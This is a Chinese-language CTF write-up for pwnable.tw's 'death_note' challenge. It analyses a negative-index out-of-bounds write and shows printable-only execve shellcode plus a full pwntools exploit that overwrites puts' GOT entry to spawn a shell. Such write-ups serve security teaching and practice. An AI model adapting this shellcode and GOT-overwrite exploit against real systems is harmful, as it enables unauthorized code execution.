## 检查

```
$ file death_note 
death_note: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=547f3a1cf19ffe5798d45def2f4bc5c585af88f5, not stripped
$ checksec death_note 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

32位程序，没去符号表，只开了canary

## 分析

### add_note()

index不能大于10，会检查name是否为可打印字符，同时会malloc一块地址用于存储字符串内容，将地址保存在note[index]数组中，但是index可以为负数，会造成数组越界

### show_note()

读取地址指向的内容，同样存在数组越界的问题

### del_note()

会free掉那块内存并清零指针

## 漏洞点

read_int()函数中没有检查index是否为负数，使得数组越界造成任意地址写

## 利用

我们可以构造出全是可见字符的shellcode，然后将got表地址改为我们需要执行的指令入口即可

### shellcode

常见的shellcode思路是利用int 80h陷入软中断，

并使得eax内容为0x0b，ebx指向一个字符串”/bin/sh”，ecx、edx置0。如shellcraft.sh()

```asm
/* execve(path='/bin///sh', argv=['sh'], envp=0) */
/* push '/bin///sh\x00' */
push 0x68
push 0x732f2f2f
push 0x6e69622f
mov ebx, esp
/* push argument array ['sh\x00'] */
/* push 'sh\x00\x00' */
push 0x1010101
xor dword ptr [esp], 0x1016972
xor ecx, ecx
push ecx /* null terminate */
push 4
pop ecx
add ecx, esp
push ecx /* 'sh\x00' */
mov ecx, esp
xor edx, edx
/* call execve() */
push SYS_execve /* 0xb */
pop eax
int 0x80
```

但是由于本题的限制，并不能直接使用

根据某师傅博客中写到，此题可用的汇编指令如下:

```asm
1.数据传送:
push/pop eax…
pusha/popa

2.算术运算:
inc/dec eax…
sub al, 立即数
sub byte ptr [eax… + 立即数], al dl…
sub byte ptr [eax… + 立即数], ah dh…
sub dword ptr [eax… + 立即数], esi edi
sub word ptr [eax… + 立即数], si di
sub al dl…, byte ptr [eax… + 立即数]
sub ah dh…, byte ptr [eax… + 立即数]
sub esi edi, dword ptr [eax… + 立即数]
sub si di, word ptr [eax… + 立即数]

3.逻辑运算:
and al, 立即数
and dword ptr [eax… + 立即数], esi edi
and word ptr [eax… + 立即数], si di
and ah dh…, byte ptr [ecx edx… + 立即数]
and esi edi, dword ptr [eax… + 立即数]
and si di, word ptr [eax… + 立即数]

xor al, 立即数
xor byte ptr [eax… + 立即数], al dl…
xor byte ptr [eax… + 立即数], ah dh…
xor dword ptr [eax… + 立即数], esi edi
xor word ptr [eax… + 立即数], si di
xor al dl…, byte ptr [eax… + 立即数]
xor ah dh…, byte ptr [eax… + 立即数]
xor esi edi, dword ptr [eax… + 立即数]
xor si di, word ptr [eax… + 立即数]

4.比较指令:
cmp al, 立即数
cmp byte ptr [eax… + 立即数], al dl…
cmp byte ptr [eax… + 立即数], ah dh…
cmp dword ptr [eax… + 立即数], esi edi
cmp word ptr [eax… + 立即数], si di
cmp al dl…, byte ptr [eax… + 立即数]
cmp ah dh…, byte ptr [eax… + 立即数]
cmp esi edi, dword ptr [eax… + 立即数]
cmp si di, word ptr [eax… + 立即数]

5.转移指令:
push 56h
pop eax
cmp al, 43h
jnz lable

<=> jmp lable

6.交换al, ah
push eax
xor ah, byte ptr [esp] // ah ^= al
xor byte ptr [esp], ah // al ^= ah
xor ah, byte ptr [esp] // ah ^= al
pop eax

7.清零:
push 44h
pop eax
sub al, 44h ; eax = 0

push esi
push esp
pop eax
xor [eax], esi ; esi = 0
```

我们可以先看看执行shellcode时的寄存器状况（断在了地址0x080487ef，即 call puts

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-deathnote-1.png)

可以发现，edx寄存器地址是shellcode的起始地址，而ebx、ecx的值是0，可以用来置0

我们可以修改shellcode如下

```asm
/* execve(path='/bin///sh', argv=0, envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx
   /*rewrite shellcode to get 'int 80'*/
   /* int 80 = \xcd\x80 */
    push edx
    pop eax
    push 0x60606060
    pop edx
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x34] , dl
    push 0x3e3e3e3e
    pop edx
    sub byte ptr[eax + 0x34] , dl
    /*set zero to edx*/
    push ecx
    pop edx
   /*set 0x0b to eax*/
    push edx
    pop eax
    xor al, 0x40
    xor al, 0x4b    
  /*foo order,for holding the  place*/
    push edx
    pop edx
    push edx
    pop edx
```



### 修改got表

我们可以直接修改puts的got表，可以看到note的地址是0x0804A060，而我们只需要获得puts的got表地址，将它们相减并除以4即可

## exp

我们需要获得的是32位汇编，所以不要把arch置为amd64

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

#context(arch='amd64',os='linux',log_level='debug')
context.log_level = 'debug'

debug = 0
if debug:
	elf = ELF("./death_note")
	libc = ELF("./libc_32.so.6")
	io = process(elf.path)
else:
	elf = ELF("./death_note")
	libc = ELF("./libc_32.so.6")
	io = remote("chall.pwnable.tw",10201)

################################################
s = io.send                                    #
sl = io.sendline                               #
sa = io.sendafter                              #
sla = io.sendlineafter                         #
r = io.recv                                    #
rl = io.recvline                               #
ru = io.recvuntil                              #
it = io.interactive                            #
################################################

addnote = lambda index,name : (sla("choice :","1"),sla("Index :", str(index)),sla("Name :",name))


puts_got = elf.got["puts"]
note_addr = 0x0804a060
shellcode = '''
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx

    push edx
    pop eax
    push 0x60606060
    pop edx
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x34] , dl
    push 0x3e3e3e3e
    pop edx
    sub byte ptr[eax + 0x34] , dl

    push ecx
    pop edx



    push edx
    pop eax
    xor al, 0x40
    xor al, 0x4b    
    push edx
    pop edx
    push edx
    pop edx
'''
shellcode = asm(shellcode) + '\x6b\x40'

index = (puts_got - note_addr)/4
addnote(index,shellcode)

io.interactive()

```



参考：

- [【PWNABLE.TW】 deathnote 解题思路](http://p4nda.top/2017/09/29/pwnable-tw-deathnote/)

